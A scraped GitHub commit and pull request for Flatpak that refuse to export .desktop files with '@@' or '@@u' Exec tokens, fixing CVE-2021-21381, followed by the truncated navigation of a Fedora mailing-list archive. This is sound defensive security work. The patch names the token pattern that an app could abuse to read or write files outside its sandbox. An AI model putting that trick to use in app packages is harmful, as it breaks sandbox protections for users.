[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=flatpak%2Fflatpak)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[flatpak](/flatpak)
/
**[flatpak](/flatpak/flatpak)**
Public

* [Notifications](/login?return_to=%2Fflatpak%2Fflatpak) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Fflatpak%2Fflatpak)
* [Star
   4.3k](/login?return_to=%2Fflatpak%2Fflatpak)

* [Code](/flatpak/flatpak)
* [Issues
  972](/flatpak/flatpak/issues)
* [Pull requests
  76](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects
  0](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

Additional navigation options

* [Code](/flatpak/flatpak)
* [Issues](/flatpak/flatpak/issues)
* [Pull requests](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

## Commit

[Permalink](/flatpak/flatpak/commit/a7401e638bf0c03102039e216ab1081922f140ae)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

dir: Refuse to export .desktop files with suspicious uses of @@ tokens

[Browse files](/flatpak/flatpak/tree/a7401e638bf0c03102039e216ab1081922f140ae)
Browse the repository at this point in the history

```
This is either a malicious/compromised app trying to do an attack, or
a mistake that will break handling of %f, %u and so on. Either way,
if we refuse to export the .desktop file, resulting in installation
failing, then it makes the rejection more obvious than quietly
removing the magic tokens.

Signed-off-by: Simon McVittie <smcv@collabora.com>
(cherry picked from commit [46b3ede](https://github.com/flatpak/flatpak/commit/46b3ede5241561c7d588951048c687c5075a3eac))
```

* Loading branch information

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&v=4)](/smcv) [![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=40&v=4)](/alexlarsson)

[smcv](/flatpak/flatpak/commits?author=smcv "View all commits by smcv")
authored and
[alexlarsson](/flatpak/flatpak/commits?author=alexlarsson "View all commits by alexlarsson")
committed
Mar 10, 2021

1 parent
[eb7946b](/flatpak/flatpak/commit/eb7946bb6248923d8c90fe9b84425fef97ae580d)

commit a7401e6

Showing
**1 changed file**
with
**5 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

6 changes: 5 additions & 1 deletion

6
[common/flatpak-dir.c](#diff-d9bbbd38e2a88a01804605a2d35dc54e31a761255be1fd7631f411778d1060a3 "common/flatpak-dir.c")

Show comments

[View file](/flatpak/flatpak/blob/a7401e638bf0c03102039e216ab1081922f140ae/common/flatpak-dir.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7140,7 +7140,11 @@ export\_desktop\_file (const char \*app, |
|  |  | else if (strcasecmp (arg, "%u") == 0) |
|  |  | g\_string\_append\_printf (new\_exec, " @@u %s @@", arg); |
|  |  | else if (g\_str\_has\_prefix (arg, "@@")) |
|  |  | g\_print (\_("Skipping invalid Exec argument %s\n"), arg); |
|  |  | { |
|  |  | flatpak\_fail\_error (error, FLATPAK\_ERROR\_EXPORT\_FAILED, |
|  |  | \_("Invalid Exec argument %s"), arg); |
|  |  | goto out; |
|  |  | } |
|  |  | else |
|  |  | g\_string\_append\_printf (new\_exec, " %s", arg); |
|  |  | } |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `a7401e6`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fcommit%2Fa7401e638bf0c03102039e216ab1081922f140ae) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_a074a405_20250114_175907.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fpull%2F4156)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fpull%2F4156)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=flatpak%2Fflatpak)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[flatpak](/flatpak)
/
**[flatpak](/flatpak/flatpak)**
Public

* [Notifications](/login?return_to=%2Fflatpak%2Fflatpak) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Fflatpak%2Fflatpak)
* [Star
   4.3k](/login?return_to=%2Fflatpak%2Fflatpak)

* [Code](/flatpak/flatpak)
* [Issues
  972](/flatpak/flatpak/issues)
* [Pull requests
  76](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects
  0](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

Additional navigation options

* [Code](/flatpak/flatpak)
* [Issues](/flatpak/flatpak/issues)
* [Pull requests](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fflatpak%2Fflatpak%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fflatpak%2Fflatpak%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Disallow @@ and @@u magic tokens in desktop files #4156

 Merged

[alexlarsson](/alexlarsson)
merged 3 commits into
[flatpak:master](/flatpak/flatpak/tree/master "flatpak/flatpak:master")
from
[smcv:avoid-magic-tokens](/smcv/flatpak/tree/avoid-magic-tokens "smcv/flatpak:avoid-magic-tokens")

Mar 10, 2021

 Merged

# [Disallow @@ and @@u magic tokens in desktop files](#top) #4156

[alexlarsson](/alexlarsson)
merged 3 commits into
[flatpak:master](/flatpak/flatpak/tree/master "flatpak/flatpak:master")
from
[smcv:avoid-magic-tokens](/smcv/flatpak/tree/avoid-magic-tokens "smcv/flatpak:avoid-magic-tokens")

Mar 10, 2021

[Conversation
0](/flatpak/flatpak/pull/4156)
[Commits
3](/flatpak/flatpak/pull/4156/commits)
[Checks
0](/flatpak/flatpak/pull/4156/checks)
[Files changed](/flatpak/flatpak/pull/4156/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![smcv](https://avatars.githubusercontent.com/u/1561141?s=60&v=4)](/smcv)

Copy link

Collaborator

### @smcv **[smcv](/smcv)** commented [Mar 5, 2021](#issue-823124611) • edited Loading

* Disallow `@@` and `@@u` usage in desktop files

  From: [@refi64](https://github.com/refi64)

  Fixes [CVE-2021-21381: Arbitrary file read/write without permissions via special token in .desktop file #4146](https://github.com/flatpak/flatpak/issues/4146).
* dir: Reserve the whole `@@` prefix

  If we add new features analogous to file forwarding later, we might

  find that we need a different magic token. Let's reserve the whole

  `@@*` namespace so we can call it `@@something-else`.
* dir: Refuse to export .desktop files with suspicious uses of `@@` tokens

  This is either a malicious/compromised app trying to do an attack, or

  a mistake that will break handling of %f, %u and so on. Either way,

  if we refuse to export the .desktop file, resulting in installation

  failing, then it makes the rejection more obvious than quietly

  removing the magic tokens.

---

This is a revised version of [#4148](https://github.com/flatpak/flatpak/pull/4148), incorporating my suggestions. With this version, installing the app fails:

```
Error: Invalid Exec argument @@
error: Failed to install bundle com.example.Foo: Invalid Exec argument @@

```

cc [@refi64](https://github.com/refi64) [@matthiasclasen](https://github.com/matthiasclasen)

Sorry, something went wrong.

All reactions

 [refi64](/refi64)
and others
added 3 commits
[March 2, 2021 13:20](#commits-pushed-cb6fce9)

[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&v=4)](/refi64)

`[Disallow @@ and @](/flatpak/flatpak/pull/4156/commits/cb6fce9e4122ace2960c437def3b1a197bb49b3a "Disallow @@ and @@u usage in desktop files

Fixes #4146.")[@U](https://github.com/U) [usage in desktop files](/flatpak/flatpak/pull/4156/commits/cb6fce9e4122ace2960c437def3b1a197bb49b3a "Disallow @@ and @@u usage in desktop files

Fixes #4146.")`
 …

`[cb6fce9](/flatpak/flatpak/pull/4156/commits/cb6fce9e4122ace2960c437def3b1a197bb49b3a)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).
```

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&v=4)](/smcv)

`[dir: Reserve the whole @@ prefix](/flatpak/flatpak/pull/4156/commits/0bdcb88b2d0013aa435dc03950fb42cef2cbd359 "dir: Reserve the whole @@ prefix

If we add new features analogous to file forwarding later, we might
find that we need a different magic token. Let's reserve the whole
@@* namespace so we can call it @@something-else.

Signed-off-by: Simon McVittie <smcv@collabora.com>")`
 …

`[0bdcb88](/flatpak/flatpak/pull/4156/commits/0bdcb88b2d0013aa435dc03950fb42cef2cbd359)`

```
If we add new features analogous to file forwarding later, we might
find that we need a different magic token. Let's reserve the whole
@@* namespace so we can call it @[@something-else](https://github.com/something-else).

Signed-off-by: Simon McVittie <smcv@collabora.com>
```

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&v=4)](/smcv)

`[dir: Refuse to export .desktop files with suspicious uses of @@ tokens](/flatpak/flatpak/pull/4156/commits/230f4c3521cd0dffa446ab9b70e958cdd9241bbe "dir: Refuse to export .desktop files with suspicious uses of @@ tokens

This is either a malicious/compromised app trying to do an attack, or
a mistake that will break handling of %f, %u and so on. Either way,
if we refuse to export the .desktop file, resulting in installation
failing, then it makes the rejection more obvious than quietly
removing the magic tokens.

Signed-off-by: Simon McVittie <smcv@collabora.com>")`
 …

`[230f4c3](/flatpak/flatpak/pull/4156/commits/230f4c3521cd0dffa446ab9b70e958cdd9241bbe)`

```
This is either a malicious/compromised app trying to do an attack, or
a mistake that will break handling of %f, %u and so on. Either way,
if we refuse to export the .desktop file, resulting in installation
failing, then it makes the rejection more obvious than quietly
removing the magic tokens.

Signed-off-by: Simon McVittie <smcv@collabora.com>
```

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&u=daeb9f79b5ea25e2a8dd236af718393f95e153c3&v=4)](/smcv)
[smcv](/smcv)
mentioned this pull request
[Mar 5, 2021](#ref-pullrequest-820312951)

[Disallow @@ and @@u usage in desktop files
#4148](/flatpak/flatpak/pull/4148)
 Closed

[![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=40&v=4)](/alexlarsson)
[alexlarsson](/alexlarsson)
merged commit [`46b3ede`](/flatpak/flatpak/commit/46b3ede5241561c7d588951048c687c5075a3eac)
into
flatpak:master

[Mar 10, 2021](https://github.com/flatpak/flatpak/pull/4156#event-4434936120)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fpull%2F4156)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

 [CVE-2021-21381: Arbitrary file read/write without permissions via special token in .desktop file](https://github.com/flatpak/flatpak/issues/4146)

3 participants

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=52&v=4)](/smcv) [![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=52&v=4)](/alexlarsson) [![@refi64](https://avatars.githubusercontent.com/u/1690697?s=52&v=4)](/refi64)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.fedoraproject.org_ddd11a2b_20250114_175911.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

